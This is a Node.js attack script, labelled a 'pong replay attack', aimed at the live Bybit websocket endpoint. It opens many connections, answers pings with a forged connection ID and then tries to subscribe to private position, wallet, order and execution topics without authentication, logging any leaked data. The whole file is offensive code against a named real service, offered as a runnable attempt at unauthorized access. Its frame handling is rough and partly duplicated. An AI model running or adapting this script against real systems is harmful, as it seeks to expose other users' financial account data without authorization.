const https = require('https');
const crypto = require('crypto');

const TARGET_HOST = 'stream.bybit.com';
const TARGET_PATH = '/v5/public/linear';
const CONNECTIONS = 20; // Start safe
const MALICIOUS_CONN_ID = "fake-conn-id-99999";

console.log("========================================");
console.log("BYBIT WS PONG REPLAY ATTACK (Node.js)");
console.log("Target: wss://" + TARGET_HOST + TARGET_PATH);
console.log("========================================");

function connect(id) {
    const key = crypto.randomBytes(16).toString('base64');
    const options = {
        hostname: TARGET_HOST,
        port: 443,
        path: TARGET_PATH,
        headers: {
            'Connection': 'Upgrade',
            'Upgrade': 'websocket',
            'Sec-WebSocket-Key': key,
            'Sec-WebSocket-Version': '13'
        }
    };

    const req = https.request(options);

    req.on('upgrade', (res, socket, head) => {
        // console.log(`[${id}] Connected!`);
        
        socket.on('data', (buffer) => {
            // Basic frame parsing
            let offset = 0;
            if (buffer.length < 2) return;
            
            const opcode = buffer[0] & 0x0F;
            const len = buffer[1] & 0x7F;
            
            // Parse payload roughly just to find text
            if (opcode === 0x1) { // TEXT FRAME
                try {
                    // Note: Server doesn't mask frames to client usually
                    // Skip header (assume short payload for speed or check bits)
                    // Real parsing is complex, let's just convert buffer to string and grep
                    const str = buffer.toString();
                    
                    if (str.includes("wallet") || str.includes("balance") || str.includes("position")) {
                        console.log(`[${id}] 🚨 POTENTIAL LEAK: ${str.substring(0, 100)}...`);
                    }
                    
                    // Log occasional keepalives
                    if (Math.random() < 0.01) console.log(`[${id}] Alive...`);
                    
                } catch (e) {}
            }
            
            if (opcode === 0x9) { // PING
                // console.log(`[${id}] PING received`);
                
                // Construct PONG frame
                // Opcode 0xA (Pong), Masked
                
                const payload = JSON.stringify({
                    "op": "pong",
                    "req_id": "100001", 
                    "conn_id": MALICIOUS_CONN_ID // THE ATTACK
                });
                
                const frame = buildFrame(payload);
                socket.write(frame);

                // ATTACK PHASE 2:
                // Immediately try to subscribe to PRIVATE topics without auth
                // If desync worked, server might think we are the user associated with 'fake-conn-id'
                setTimeout(() => {
                    const attackSub = JSON.stringify({
                        "op": "subscribe",
                        "args": [
                            "position",
                            "wallet",
                            "execution",
                            "order"
                        ]
                    });
                    socket.write(buildFrame(attackSub));
                }, 100); // Tiny delay to let PONG process
            }
            
            // Check for leaks (text frame)
            if (opcode === 0x1) { 
                 try {
                    const str = buffer.toString();
                    
                    // Log any success on private topics
                    if (str.includes("position") || str.includes("wallet")) {
                        console.log(`[${id}] 🚨 LEAK/SUCCESS: ${str.substring(0, 150)}...`);
                    } else if (str.includes("success") && str.includes("subscribe")) {
                         console.log(`[${id}] ⚠️  Subscription SUCCESS (Check if private!)`);
                         console.log(`[${id}] >> ${str.substring(0, 100)}`);
                    }
                    
                 } catch (e) {}
            }
        });

        // Send initial subscribe to provoke traffic
        const sub = JSON.stringify({
            "op": "subscribe",
            "args": ["orderbook.1.BTCUSDT"]
        });
        socket.write(buildFrame(sub));
    });

    req.on('error', (e) => {
        // console.log(`[${id}] Error: ${e.message}`);
    });

    req.end();
}

function buildFrame(payload) {
    const payloadByteLength = Buffer.byteLength(payload);
    let frame = [];
    
    // Fin + Opcode (Text = 1)
    frame.push(0x81); // 1000 0001
    
    // Masked + Length
    if (payloadByteLength <= 125) {
        frame.push(0x80 | payloadByteLength);
    } else if (payloadByteLength <= 65535) {
        frame.push(0x80 | 126);
        frame.push((payloadByteLength >> 8) & 0xFF);
        frame.push(payloadByteLength & 0xFF);
    } else {
        // Too big
    }
    
    // Mask Key (4 bytes)
    const maskKey = crypto.randomBytes(4);
    frame.push(...maskKey);
    
    // Payload masked
    const payloadBuf = Buffer.from(payload);
    for (let i = 0; i < payloadByteLength; i++) {
        frame.push(payloadBuf[i] ^ maskKey[i % 4]);
    }
    
    return Buffer.from(frame);
}

// Launch Flood
console.log(`Launching ${CONNECTIONS} connections...`);
for(let i=0; i<CONNECTIONS; i++) {
    setTimeout(() => connect(i), i * 50);
}

// Keep alive for 30 seconds
setTimeout(() => {
    console.log("Test finished.");
    process.exit(0);
}, 30000);
